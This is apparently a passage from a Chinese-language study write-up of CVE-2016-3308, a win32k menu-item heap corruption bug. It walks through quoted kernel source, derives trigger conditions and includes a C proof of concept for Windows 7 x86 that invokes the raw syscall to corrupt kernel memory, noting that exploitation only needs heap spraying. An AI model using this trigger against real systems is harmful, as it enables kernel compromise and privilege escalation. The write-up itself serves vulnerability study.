        {
            pNewItems = (PITEM)DesktopAlloc(pMenu->head.rpdesk->hheapDesktop,   // [+] 如果是不是第一次的话 就重新分配一个更大的
                    (pMenu->cAlloced + CMENUITEMALLOC) * sizeof(ITEM));
            if (pNewItems) 
            {
                RtlCopyMemory(pNewItems, pMenu->rgItems,
                        pMenu->cAlloced * sizeof(ITEM));    // [+] 则分配到那里去即可
                DesktopFree(pMenu->head.rpdesk->hheapDesktop, pMenu->rgItems);  // [+] 释放相应的堆
            }
        } 
         if (pNewItems == NULL)
            return(FALSE);
        pMenu->cAlloced += CMENUITEMALLOC;  // [+] 这个地方扩大
        pMenu->rgItems = pNewItems; // [+] 重新定义
当`cItems >= cAlloc`的时候. 会重新分配内存. 释放原有的旧的内存. 并且让`tagMneu->rgItem`指向新的内存块.
我们原来第一步找到的是指向旧的内存的. 所以我们需要重新找过.
    if (wIndex != MFMWFP_NOITEM)
            pItem = MNLookUpItem(pMenu, wIndex, fByPosition, &pMenuItemIsOn);   // [+] 第二次调用MNLookUpMenu.
接着再进行赋值操作. 我们重新来看赋值操作. 赋值操作的实现里面有一个有意思的点. 注意看第三个参数. 他是通过地址来计算的需要挪的位置.
    memmove(pItem + 1, pItem, (pMenu->cItems - 1) * sizeof(ITEM) - ((char *)pItem - (char *)pMenu->rgItems));   // pItem进行填充, 然后把剩余的部分放进去
这里问题就出现了. 我们说过. `MNLookUpItem`函数进行的是递归查找. 如果我们返回的`pItem`是子项的子项的内容.
此时pMenu->rgItems指向的值子项的内存块. 这个地方的计算就会找出严重的失误. 举个例子:
    我们有一个菜单的分布如下:
        Menu:
            MenuChild-1
                MenuChild-1-0
                MenuChild-1-1
                MunuChild-1-2
            MunuChild-2
            MenuChild-3
MenuChild- _这个数组假设存放于0x1000处. MenuChild-1-_ 存放于存放于0x4000处. 这两个数组通过地址来计算显然是错误的.
第一个问题是:
  * 第一次MNLookUpItem的时候为什么没有出错
我们可以看到源码:
    pItem = MNLookUpItem(pMenu, wIndex, fByPosition, &pMenuItemIsOn);  // [+] 我们可以传入wIndex == -1. 然后通过后面的操作使其变为非 -1 ??? 是这个意思么?
        if (pItem != NULL)
            pMenu = pMenuItemIsOn;  // [+] 这个地方才是最重要的... 如果没有替换的话 那么很容易出错
如果找到了的话. 会进行替换. 而我们查看第二次的源码. 是没有替换的操作的.
第二个问题是. 我们如何取触发第二次MNLookUpItem函数. 我逆向了相应的源码. 得出的条件如下.
### 触发条件
第一个条件: wIndex为子菜单第一项的wID. 这样的话后续有一个操作. fByPosition为TRUE.
    wSave = w = wIndex;
        if (pItem && !fByPosition)
            w = ((PBYTE)pItem - (PBYTE)(pMenu->rgItems)) / sizeof(ITEM);    // [+] 一共有多少项
此时由于我们找到的第一项. 所以算出wID为0. 接着进入下面的代码流:
    if (!w) // [+] 这个地方判断是否为第一项
        {
            pItemWalk = pMenu->rgItems; // [+] 直接获取第一项的值
            if ((pItemWalk->hbmp == (HBITMAP)MENUHBM_SYSTEM))
                wIndex = 1; // [+] 设置为1
这个地方我们通过设置pItemWalks的hbmp为MENUHBM_SYSTEM(IDA里面显示为常数1). wIndex会变为1.
接着我们给子菜单安排8个菜单项. 进行插入第九项的时候会进入到我们先前说的重新分配的逻辑.
    if (wIndex != MFMWFP_NOITEM)
                pItem = MNLookUpItem(pMenu, wIndex, fByPosition, &pMenuItemIsOn);   // [+] 需要使用我们的程序流使其执行到这里
由于此时wIndex = 1. 我们只要安排子菜单的子菜单当中的某一项的wID为1即可.
## poc
POC可以在[这里](https://github.com/redogwu/cve-study-write/tree/master/cve-2016-0038)找到. 你可能需要运行多次才能触发. 因为可能损坏的可能不是重要的内存.
利用的话控制堆喷即可.
    /*
    * [+] cve-2016-3308:
    * [+] It just a poc.
    * [+] Test version: windows 7 x86
    * [+] It should work, BUt you need to to execute it more once(maybe)
    * [+] By wjllz
    */
    #include 
    #include 
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
    HMENU hMenu = NULL;
    _declspec(naked) BOOL NtUserThunkedMenuItemInfo(
        IN HMENU hMenu,
        IN UINT nPosition,
        IN BOOL fByPosition,
        IN BOOL fInsert,
        IN LPMENUITEMINFOW lpmii OPTIONAL,
        IN PUNICODE_STRING pstrItem OPTIONAL,
        IN BOOL fAnsi)
    {
        __asm
        {
            mov     eax, 1256h
            mov     edx, 7ffe0300h
            call    dword ptr[edx]
            ret     18h
        }
    }
    int main()
    {
        HMENU hMenu = CreateMenu();
        HMENU hmenuPopup = CreateMenu();
        MENUITEMINFO mii = {};
        for (int i = 0; i < 0xF; i++)
        {
            mii.cbSize = sizeof(MENUITEMINFO);
            mii.fMask = MIIM_ID | MIIM_DATA | MIIM_SUBMENU | MIIM_BITMAP;
            mii.wID = (i == 6 ? 1 : 0x100 + i) ;
            mii.hSubMenu =(i == 0xE ? hmenuPopup : NULL);
            mii.hbmpItem = (i==7 ? (HBITMAP)1:NULL);
            InsertMenuItem(i < 7 ? hmenuPopup : hMenu, i < 7 ? i : i - 7, TRUE, &mii);
        }
        try 
        {
            // [+] trigger
            NtUserThunkedMenuItemInfo(hMenu, 0x107, FALSE, TRUE, (LPMENUITEMINFOW)&mii, NULL, 0);
        }
        catch (const char* msg) 
        {
        std::cerr << msg << std::endl;
        }
        return 0;
    }
## 最后的总结
这是一个老的洞. 相应的分析已经有前人做过了. 但是前段时间受到泉哥文章的影响比较大. 所以尝试着阅读源码自己去挖掘这个漏洞. 最后死在了wId ==
1的那步. 另外一个使我觉得有趣的点是. 我文章的分析是采用的Nt的老源码. 但是这个洞是16年才发现的. 也就是说起码藏了`16`年.
为什么能藏这么久呢. 以及, 为什么我在审计的时候, 最后会卡在这一部分. 漏洞发现者能够审计出来呢. 最后一个问题.
我怎么能够通过自己的`fuzzer`去触发这个漏洞呢？
这些是一些我目前比较在意的问题. 也希望在以后能找到答案.
## 相关链接
  * [55-AA-CVE-2016-3308](https://github.com/55-AA/CVE-2016-3308)
  * [An Analysis of MS16-098 / ZDI-16-453  
AUGUST 25, 2016 BY STEINER](https://warroom.securestate.com/an-analysis-of-ms16-098/)
  * [case study write](https://github.com/redogwu/cve-study-write/tree/master/cve-2016-0038)
  * [From CVE-2017-0263 to the Menu Management Component](https://xiaodaozhi.com/exploit/117.html)
Big thanks to [leeqwind](https://xiaodaozhi.com/), [泉哥](http://riusksk.me/),
[n3k](https://twitter.com/kiqueNissim).
最后, wjllz是人间大笨蛋.